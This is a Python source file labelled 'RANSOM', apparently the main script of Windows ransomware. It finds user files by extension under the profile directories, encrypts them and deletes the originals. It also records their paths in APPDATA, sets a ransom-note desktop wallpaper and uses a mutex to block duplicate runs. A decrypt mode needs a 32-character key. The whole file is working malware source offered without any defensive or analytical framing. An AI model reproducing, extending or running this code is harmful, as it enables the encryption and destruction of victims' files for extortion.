## RANSOM
## Main Script
## author mls

# Import libs
import ctypes
import os
import sys
import win32api
import winerror
import win32event

# Import classes
import Crypt
import Base
import image as image_handle


################
## Main Class ##
################
class Main(Base.Base):
  # Class to create a main object for the program


  def __init__(self, action, decrypt_key):
    # Init Object
    self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "files.html")

    # Init Crypt Lib
    if decrypt_key and action == "decrypt":
      self.Crypt = Crypt.SymmetricCrypto(decrypt_key)
    else:
      self.Crypt = Crypt.SymmetricCrypto()

    # Fetch files
    file_list = self.find_files()

    # handle action
    if action == "encrypt" and not os.path.isfile(self.encrypted_file_list):
      # Start encryption
      self.encrypt_files(file_list)
      self.set_wallpaper()
    elif action == "decrypt":
      # Start decryption
      self.decrypt_files()


  def decrypt_files(self):
    # Function to decrypt the provided files

    # Get list of encrypted files
    try:
      with open(self.encrypted_file_list) as fh:
        file_list = fh.read()
      fh.close()
    except IOError:
      raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)

    # Decrypt!
    for encrypted_file in file_list.split("<br>"):
      if not encrypted_file:
        continue

      print("Decrypting {}".format(encrypted_file.rstrip()))

      # IF successful decryption, delete locked file
      locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip())
      if locked_path:
        os.remove(locked_path)

    # Remove encrypted file list
    os.remove(self.encrypted_file_list)


  def encrypt_files(self, file_list):
    # Function to encrypt the provided files
    encrypted_files = []

    # Encrypt them and add to list if successful
    for file in file_list:

      # Encrypt file if less than specified file size
      if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
        is_encrypted = self.Crypt.encrypt_file(file)
      else:
        is_encrypted = False

      # IF encrypted, try to delete the file and add to the list
      if is_encrypted:
        try:
          os.remove(file)
        # Ignore any exception, such as access denied, and continue
        except:
          continue
        encrypted_files.append(file)

    # Write out list of encrypted files
    if encrypted_files:
      fh = open(self.encrypted_file_list, "w")
      for encrypted_file in encrypted_files:
        fh.write(encrypted_file)
        fh.write("<br>")
      fh.close()


  def find_files(self):
    # Function to find the relevant files to encrypt and return a list
    base_dirs = self.get_base_dirs(os.environ['USERPROFILE'])
    file_list = []

    for directory in base_dirs:
      for path,subdirs,files in os.walk(directory):
        for file in files:
          if os.path.isfile(os.path.join(path, file)):
            # Check extension is valid
            if self.is_valid_filetype(file):
              file_list.append(os.path.join(path, file))
        for file in subdirs:
          if os.path.isfile(os.path.join(path, file)):
            if self.is_valid_filetype(file):
              file_list.append(os.path.join(path, file))



    return file_list


  def is_valid_filetype(self, file):
    # Function to validate that the file extension is valid

    # Split filename
    components = file.split(".")

    # If no extension, return False
    if len(components) <= 1:
      return False

    # Get extension and check if valid
    extension = components[-1]
    if extension in self.FILETYPES:
      return True
    else:
      return False


  def set_wallpaper(self):
    # Function to set the ransom wallpaper

    # Import image and write to path
    image = image_handle.image()
    image = image.image_string.decode('hex')
    image_path = os.path.join(os.environ['APPDATA'], "note.png")
    fh = open(image_path, "wb")
    fh.write(image)
    fh.close()

    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_path, 3)


if __name__ == "__main__":

  # Parse any arguments
  args_list = sys.argv
  # Check for decrypt
  for x in args_list:
    if x == "-d" or x == "--decrypt":
      action = "decrypt"
      break
    else:
      action = "encrypt"

  # Check for key
  for x in range(len(args_list)):
    if (args_list[x] == "-k" or args_list[x] == "--key") and (action == "decrypt"):
      try:
        if len(args_list[x+1]) == 32:
          key = args_list[x+1]
          break
        else:
          key = None
          break
      except IndexError:
        key = None
        break
    else:
      # Exit if decrypting and key has not been provided
      key = None

  # START
  if action == "decrypt" and key is None:
    sys.exit()
  else:

    # Now try to create mutex
    mutex = win32event.CreateMutex(None, 1, "mutex_rr_windows")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
      mutex = None
      sys.exit()

    # Otherwise run
    else:
      ransom = Main(action, key)

